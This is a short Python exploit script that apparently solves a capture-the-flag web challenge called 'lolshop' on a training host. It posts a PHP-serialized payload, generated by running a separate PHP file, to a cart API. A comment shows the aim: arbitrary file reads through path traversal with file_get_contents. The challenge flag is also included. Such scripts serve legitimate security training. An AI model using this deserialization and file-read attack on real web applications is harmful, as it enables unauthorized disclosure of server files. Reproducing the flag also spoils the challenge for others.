#!/usr/bin/env python3

# PHP serialization challenge
# print(file_get_contents(("../lolshop/../lolshop/lolshop.php")))
# unlike local file system, in PHP ""../dir/../dir/../dir" is possible.

# actf{welcome_to_the_new_web_0836eef79166b5dc8b}

import random
import string
import requests
import os
import json
import base64


URL = "http://lolshop.training.jinblack.it/api"


def products(session):
    url = "%s/products.php" % URL
    r = session.get(url)
    return r.text


def cart(session, state):
    url = "%s/cart.php" % URL
    payload = {"state": state}
    r = session.post(url, data=payload)
    return r.text


def random_string():
    k = random.randint(6, 10)
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))


# this function can be used to run an external php file to generate serialized payload
def run_and_read_payload(file="./lolshop.php"):
    return os.popen("php %s" % file).read()


session = requests.Session()

payload = run_and_read_payload()
res_json = cart(session, payload)
print(base64.b64decode(json.loads(res_json)["picture"]))
